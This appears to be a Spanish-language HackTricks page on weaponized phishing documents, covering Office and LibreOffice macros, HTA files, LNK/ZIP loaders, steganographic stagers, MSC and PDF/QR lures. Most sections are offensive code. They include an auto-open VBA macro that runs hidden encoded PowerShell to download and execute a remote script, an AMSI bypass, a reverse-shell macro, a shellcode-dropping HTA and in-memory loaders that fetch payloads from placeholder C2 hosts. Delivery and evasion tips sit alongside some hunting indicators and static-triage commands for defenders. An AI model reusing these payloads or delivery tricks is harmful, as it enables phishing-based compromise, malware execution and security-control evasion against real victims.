# Archivos y documentos de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza una validación de los datos del archivo antes de abrirlo. La validación se realiza mediante la identificación de estructuras de datos, de acuerdo con el estándar OfficeOpenXML. Si se produce algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.

Por lo general, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible cambiar el nombre del archivo modificando su extensión y mantener la capacidad de ejecutar macros.\
Por ejemplo, por diseño, los archivos RTF no admiten macros, pero Microsoft Word procesará un archivo DOCM cuya extensión se haya cambiado a RTF y podrá ejecutar macros.\
Los mismos mecanismos internos se aplican a todo el software de Microsoft Office Suite (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para comprobar qué extensiones ejecutarán algunos programas de Office:

```bash
assoc | findstr /i "word excel powerp"
```

Los archivos DOCX que hacen referencia a una plantilla remota (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden «ejecutar» macros.

### Carga de imágenes externas

Ve a: _Insert --> Quick Parts --> Field_\
_**Categorías**: Links and References, **Nombres de campo**: includePicture, y **Nombre de archivo o URL**:_ http://<ip>/whatever

![Documentos de Office - Carga de imágenes externas: Ve a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor con macros

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de carga automática

Cuanto más comunes sean, más probable es que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Eliminar metadatos manualmente

Ve a **Archivo > Información > Inspeccionar documento > Inspeccionar documento** para abrir el Inspector de documentos. Haz clic en **Inspeccionar** y luego en **Quitar todo**, junto a **Propiedades del documento e información personal**.

#### Extensión de documento

Al terminar, selecciona el menú desplegable **Guardar como tipo** y cambia el formato de **`.docx`** a Word 97-2003 **`.doc`**.\
Hazlo porque **no puedes guardar macros dentro de un `.docx`** y existe un **estigma** **en torno a** la extensión **`.docm`**, que admite macros (por ejemplo, el icono de vista en miniatura tiene un enorme `!` y algunas pasarelas web/de correo los bloquean por completo). Por lo tanto, esta **extensión heredada `.doc` es el mejor compromiso**.

#### Generadores de macros maliciosas

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de ejecución automática de LibreOffice ODT (Basic)

Los documentos de LibreOffice Writer pueden incluir macros Basic y ejecutarlas automáticamente cuando se abre el archivo, vinculando la macro al evento **Abrir documento** (Herramientas → Personalizar → Eventos → Abrir documento → Macro…).<sup>[[1]](#references)</sup> Una macro sencilla de reverse shell sería:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Ten en cuenta las comillas dobles (`""`) dentro de la cadena: LibreOffice Basic las utiliza para escapar las comillas literales, así que los payloads que terminan en `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Consejos de entrega:

- Guarda el archivo como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar un correo con `swaks`, usa `--attach @resume.odt` (el `@` es obligatorio para enviar los bytes del archivo, no la cadena con el nombre del archivo, como adjunto). Esto es fundamental al abusar de servidores SMTP que aceptan destinatarios `RCPT TO` arbitrarios sin validación.

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación con «confianza total», sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta mediante **`mshta.exe`**, que normalmente se **instala** junto con **Internet Explorer**, por lo que `mshta` depende de IE. Si se ha desinstalado, los HTA no podrán ejecutarse.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forzar la autenticación NTLM

Hay varias formas de **forzar la autenticación NTLM «remotamente»**. Por ejemplo, podrías añadir **imágenes invisibles** a correos electrónicos o a páginas HTML que el usuario visitará (¿incluso mediante un HTTP MitM?). También podrías enviar a la víctima la **ruta de archivos** que **desencadenarán** una **autenticación** con solo **abrir la carpeta**.

**Consulta estas ideas y otras más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques NTLM relay**:

- [**Ataques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay a certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loaders LNK + payloads incrustados en ZIP (cadena fileless)

Las campañas muy eficaces distribuyen un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un archivo .lnk malicioso. El truco consiste en que el loader de PowerShell real se almacena dentro de los bytes sin procesar del ZIP, después de un marcador único, y el archivo .lnk lo extrae y lo ejecuta completamente en memoria.<sup>[[2]](#references)</sup>

Flujo típico implementado por el one-liner de PowerShell del archivo .lnk:

1) Buscar el ZIP original en ubicaciones habituales: Desktop, Downloads, Documents, %TEMP%, %ProgramData% y el directorio superior al directorio de trabajo actual.
2) Leer los bytes del ZIP y buscar un marcador codificado de forma fija (p. ej., xFIQCV). Todo lo que aparece después del marcador es el payload de PowerShell incrustado.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el archivo .docx señuelo para que parezca legítimo.
4) Omitir AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (p. ej., eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de estructura básica de PowerShell para extraer y ejecutar la etapa incrustada:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notas
- La entrega suele abusar de subdominios PaaS de buena reputación (p. ej., *.herokuapp.com) y puede filtrar los payloads (servir ZIP benignos según la IP/UA).
- La siguiente etapa suele descifrar shellcode en base64/XOR y ejecutarlo mediante Reflection.Emit + VirtualAlloc para minimizar los artefactos en disco.

Persistencia utilizada en la misma cadena
- Secuestro de COM TypeLib del control Microsoft Web Browser para que IE/Explorer o cualquier aplicación que lo integre vuelva a iniciar el payload automáticamente.<sup>[[2]](#references)[[4]](#references)</sup> Consulta los detalles y los comandos listos para usar aquí:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Búsqueda/IOC
- Archivos ZIP que contienen la cadena marcadora ASCII (p. ej., xFIQCV) añadida a los datos del archivo.
- Un archivo .lnk que enumera las carpetas principales y de usuario para localizar el ZIP y abrir un documento señuelo.
- Manipulación de AMSI mediante [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Hilos comerciales de larga duración que terminan con enlaces alojados bajo dominios PaaS de confianza.

## Preparación con señuelo LNK primero → persistencia mediante tarea programada → side-loading de CPL de confianza

Otro patrón recurrente es un **`.lnk` que suplanta un documento** y abre de inmediato un señuelo benigno mientras prepara la cadena real en segundo plano.<sup>[[3]](#references)</sup>

Flujo de trabajo observado:
1. El acceso directo **se hace pasar por un PDF** y usa `conhost.exe` o un proxy similar para iniciar un downloader de PowerShell ofuscado.
2. PowerShell fragmenta tokens evidentes (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que las detecciones ingenuas que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detecten el comando.
3. El stager descarga **primero el documento señuelo**, lo abre para la víctima y luego reconstruye los archivos maliciosos en segundo plano.
4. Los payloads pueden escribirse con **extensiones basura** y luego renombrarse eliminando caracteres de relleno, retrasando la aparición de artefactos `.exe` / `.cpl` evidentes.
5. La persistencia se establece con una **tarea programada por minuto** que inicia un binario host de confianza desde una ruta con permisos de escritura para el usuario.

Indicios mínimos para la búsqueda basados en este patrón:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Un diseño de staging útil para reconocer es:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por qué la segunda etapa es sigilosa

En el caso de estudio de Rapid7, la tarea programada ejecutaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** se había ubicado junto a él y exportaba **`RunFODW`**, el binario legítimo de Microsoft cargó mediante side-loading el CPL del atacante en lugar de la copia legítima del sistema.

Luego, el CPL:
- Lee un blob **AES-256-CBC** desde `C:\Windows\Tasks\editor.dat`
- Lo descifra mediante **Windows CNG / `bcrypt.dll`**
- Asigna memoria ejecutable y copia el shellcode descifrado
- Lo ejecuta indirectamente pasando el puntero al shellcode como callback de **`EnumUILanguagesW`**

Vale la pena buscar ese último paso por separado: el malware suele evitar un salto directo como `((void(*)())buf)()` y, en su lugar, abusa de una **WinAPI legítima que acepta callbacks** para transferir la ejecución.

El payload descifrado en esta campaña era shellcode de **Donut**, que luego cargaba el PE final completamente en memoria y parcheaba **AMSI/WLDP/ETW** en el proceso actual antes de transferirle la ejecución. Para obtener más detalles sobre el side-loading y el procesamiento posterior residente en memoria, consulta:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Puntos de búsqueda prácticos:
- Un `.lnk` que inicia `powershell.exe` o `conhost.exe`, seguido de un documento señuelo visible.
- Descargas de corta duración a **`C:\Users\Public\`**, seguidas de cambios inmediatos de nombre desde extensiones sin sentido.
- Tareas programadas con nombres anodinos, como `GoogleErrorReport`, que se ejecutan desde **directorios modificables por el usuario**.
- Binarios de confianza que cargan archivos **`.cpl` / `.dll`** desde el mismo directorio que no es del sistema.
- Blobs de texto Base64 escritos en **`C:\Windows\Tasks\`** y luego leídos por el módulo cargado mediante side-loading.

## Payloads delimitados por esteganografía en imágenes (stager de PowerShell)

Las cadenas de carga recientes distribuyen un JavaScript/VBS ofuscado que decodifica y ejecuta un stager de PowerShell en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una DLL de .NET codificada en Base64 y oculta como texto sin formato entre marcadores únicos de inicio y fin. El script busca estos delimitadores (ejemplos observados en la práctica: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, lo decodifica de Base64 a bytes, carga el ensamblado en memoria e invoca un método de entrada conocido con la URL de C2.<sup>[[5]](#references)</sup>

Flujo de trabajo
- Etapa 1: Dropper JS/VBS archivado → decodifica el Base64 incrustado → inicia el stager de PowerShell con -nop -w hidden -ep bypass.
- Etapa 2: Stager de PowerShell → descarga la imagen, extrae el Base64 delimitado por marcadores, carga la DLL de .NET en memoria e invoca su método (p. ej., VAI), pasando la URL de C2 y las opciones.
- Etapa 3: El loader recupera el payload final y normalmente lo inyecta mediante process hollowing en un binario de confianza (comúnmente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Aquí encontrarás más información sobre process hollowing y la ejecución mediante proxy de utilidades de confianza:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ejemplo de PowerShell para extraer una DLL de una imagen e invocar un método de .NET en memoria:

<details>
<summary>Extractor y loader de payload esteganográfico en PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notas
- Esto es ATT&CK T1027.003 (esteganografía/ocultación de marcadores).<sup>[[6]](#references)</sup> Los marcadores varían entre campañas.
- El bypass de AMSI/ETW y la desofuscación de cadenas suelen aplicarse antes de cargar el assembly.
- Búsqueda: analizar las imágenes descargadas en busca de delimitadores conocidos; identificar PowerShell accediendo a imágenes y decodificando inmediatamente blobs Base64.

Consulta también las herramientas de stego y las técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging de PowerShell con Base64

Una etapa inicial recurrente es un archivo `.js` o `.vbs` pequeño y muy ofuscado, distribuido dentro de un archivo comprimido. Su único propósito es decodificar una cadena Base64 incrustada y ejecutar PowerShell con `-nop -w hidden -ep bypass` para iniciar la siguiente etapa a través de HTTPS.<sup>[[5]](#references)</sup>

Lógica básica (abstracta):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre cadenas basura
- Decodificarlo a PowerShell ASCII
- Ejecutarlo con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicadores para la búsqueda
- Archivos adjuntos JS/VBS comprimidos que ejecutan `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
- `wscript.exe` ejecutando `powershell.exe -nop -w hidden` desde rutas temporales del usuario.

## Documentos MSC como contenedores de ejecución (GrimResource)

Los archivos Microsoft Management Console (`.msc`) son definiciones XML de consolas que normalmente abre `mmc.exe`. **GrimResource** arma una referencia `StringTable` a un recurso `apds.dll` que contiene una antigua primitiva XSS, de modo que al abrir la consola manipulada, el usuario provoca la ejecución de JavaScript dentro de `mmc.exe`. Las muestras observadas combinaban ofuscación basada en `transformNode` con **DotNetToJScript** para instanciar un payload .NET sin recurrir a la ruta habitual de macros de Office.<sup>[[9]](#references)</sup>

Para el triage estático, trata un MSC no confiable como texto y **no** hagas doble clic en él:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Los pivotes de runtime de alta señal son que `mmc.exe` cargue el CLR o componentes de script, cree conexiones de red o inicie `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un ejecutable inesperado. El formato es legítimo, por lo que las detecciones deberían correlacionar **origen + contenido XML/script sospechoso + comportamiento de `mmc.exe`** en lugar de bloquear todos los MSC.<sup>[[9]](#references)</sup>

## Redireccionadores PDF/QR y control de payloads

Un PDF no necesita un exploit para ser útil. Campañas recientes incluyen un **código QR o un enlace común** en un documento de apariencia inofensiva, alejan la sesión del navegador de los controles del correo y personalizan el destino con la dirección del destinatario. Microsoft documentó en 2025 PDF con URL de códigos QR únicas para cada destinatario que conducían a una infraestructura de recolección de credenciales de RaccoonO365; una cadena paralela usaba controles de IP/entorno para devolver una ruta JavaScript/MSI a visitantes seleccionados y un PDF inofensivo a los scanners o clientes no permitidos.<sup>[[10]](#references)</sup>

Analiza tanto las acciones del PDF como los códigos QR renderizados. Un QR puede estar dibujado con vectores en lugar de almacenarse como una imagen extraíble, así que rasteriza todas las páginas además de extraer las imágenes incrustadas:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspecciona los destinos decodificados y las redirecciones desde un sistema de análisis aislado, sin autenticarte. Entre las características útiles para hunting se incluyen PDFs que solo contienen un QR con cuerpos de correo casi vacíos, la dirección de correo del destinatario incrustada en un parámetro de consulta, varias redirecciones a través de servicios de hosting de buena reputación y contenido distinto según la IP, la geolocalización, las cookies, el referrer o el user agent. Compara las solicitudes con perfiles controlados, porque una única consulta desde un sandbox podría recibir solo el señuelo.<sup>[[10]](#references)</sup>

## Archivos de Windows para robar hashes NTLM

Consulta la página sobre **lugares donde robar credenciales NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job: macro de LibreOffice → webshell de IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research: campaña ZipLine: un sofisticado ataque de phishing dirigido a empresas estadounidenses](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7: malware a la mode: seguimiento de las tácticas de Dropping Elephant mediante una cadena de loaders con temática china](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib: nueva técnica de persistencia COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42: PhantomVAI Loader distribuye diversos infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK: esteganografía (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK: Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK: ejecución mediante proxy de utilidades de desarrollador de confianza: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs: GrimResource: Microsoft Management Console para el acceso inicial y la evasión](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog: actores de amenazas aprovechan la temporada de impuestos para desplegar campañas de phishing con temática fiscal](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
